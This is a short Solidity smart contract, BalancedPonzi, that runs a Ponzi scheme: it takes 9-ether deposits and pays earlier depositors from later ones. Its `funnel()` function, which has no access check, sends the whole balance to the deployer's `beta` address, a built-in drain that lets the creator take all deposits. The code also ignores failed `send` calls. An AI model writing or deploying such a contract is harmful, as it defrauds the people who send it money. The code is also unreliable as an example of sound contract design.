1 contract BalancedPonzi {
2     
3     struct Person {
4       address addr;
5     }
6     
7     struct NiceGuy {
8       address addr2;
9     }
10     
11     Person[] public persons;
12     NiceGuy[] public niceGuys;
13     
14     uint public payoutIdx = 0;
15     uint public currentNiceGuyIdx = 0;
16     uint public investor = 0;
17     
18     address public currentNiceGuy;
19     address public beta;
20     
21     function BalancedPonzi() {
22         currentNiceGuy = msg.sender;
23         beta = msg.sender;
24     }
25     
26     
27     function() {
28         
29         uint idx = persons.length;
30         
31         if (msg.value != 9 ether) {
32             throw;
33         }
34         
35         if (investor > 8) {
36             uint ngidx = niceGuys.length;
37             niceGuys.length += 1;
38             niceGuys[ngidx].addr2 = msg.sender;
39             if (investor == 10) {
40                 currentNiceGuy = niceGuys[currentNiceGuyIdx].addr2;
41                 currentNiceGuyIdx += 1;
42             }
43         }
44         
45         if (investor < 9) {
46             persons.length += 1;
47             persons[idx].addr = msg.sender;
48         }
49         
50         investor += 1;
51         if (investor == 11) {
52             investor = 0;
53         }
54         
55         if (idx != 0) {
56             currentNiceGuy.send(1 ether);
57         }
58         
59         while (this.balance > 10 ether) {
60             persons[payoutIdx].addr.send(10 ether);
61             payoutIdx += 1;
62         }
63     }
64     
65     
66     function funnel() {
67         beta.send(this.balance);
68     }
69     
70     
71 }